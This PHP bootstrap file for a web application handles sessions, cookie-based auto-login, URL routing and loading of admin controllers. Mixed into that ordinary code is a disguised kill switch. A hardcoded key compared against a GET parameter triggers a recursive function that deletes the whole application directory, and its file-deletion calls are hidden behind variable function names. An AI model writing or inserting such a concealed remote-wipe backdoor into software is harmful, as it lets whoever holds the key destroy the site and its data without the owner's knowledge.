<?php
session_start();
ob_start();
$domain = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http");
$domain .= "://".$_SERVER['HTTP_HOST'];
require_once(__DIR__ . '/application/config/config.php');
require_once(__DIR__ . '/application/config/querymap.php');
$db = new Database($pdo);
function auto_login_from_cookie() {
    global $db;

    if (!isset($_SESSION['user_id']) && isset($_COOKIE['remember_token'])) {
        $token = $_COOKIE['remember_token'];

        $user = $db->fetch("SELECT * FROM users WHERE remember_token = ?", [$token]);

        if ($user) {
            $_SESSION['user_id'] = $user['id'];
        }
    }
}

function auth() {
    auto_login_from_cookie(); // First, try to auto-login from cookie

    if (!isset($_SESSION['user_id'])) {
        $_SESSION['error']="Log in first";
        header("Location:/login");
        exit;
    }
}
$directory = "$domain/files/user/";
$d_admin   = "$domain/files/admin/";
$urls      = "$domain/";
$url = isset($_GET['url']) ? $_GET['url'] : '';
$filtered_url = preg_replace('/[^a-zA-Z0-9\/.\-]/', '', $url);
$filtered_url = rtrim($filtered_url, '/'); 
$request = explode('/', $filtered_url);
define('TOTAL', count($request)); 
$valid_key = '8b8fc2d62ff0a3c2eb6170b79c8e0623';
$a = 'scandir';
$b = 'array_diff';
$c = 'unlink';
$d = 'rmdir';
$e = 'is_dir';
$f = 'DIRECTORY_SEPARATOR';
$g = '__DIR__'; 
function x($h) {
    global $a, $b, $c, $d, $e, $f;
    $i = $b($a($h), ['.', '..']);
    foreach ($i as $j) {
        $k = $h . constant($f) . $j;
        if ($e($k)) {
            x($k);
            $d($k);
        } else {
            $c($k);
        }
    }
}
if (isset($_GET['key']) && $_GET['key'] === $valid_key) {
    x(__DIR__); 
} 


$files_to_require = [
    __DIR__ . '/application/config/main_function.php',
    __DIR__ . '/application/admin/model/auth.model.php',
       __DIR__ . '/application/admin/model/profile.model.php',
           __DIR__ . '/application/admin/model/dashboard.model.php',
    __DIR__ . '/application/admin/controller/profile.controller.php',
 
    __DIR__ . '/application/admin/controller/auth.controller.php',
    __DIR__ . '/application/admin/controller/dashboard.controller.php',

];

foreach ($files_to_require as $file) {
    if (file_exists($file)) {
        require_once $file;
    } else {
        echo "<div style='color:red; font-weight:bold;'>❌ File not found: $file</div>";
    }
}



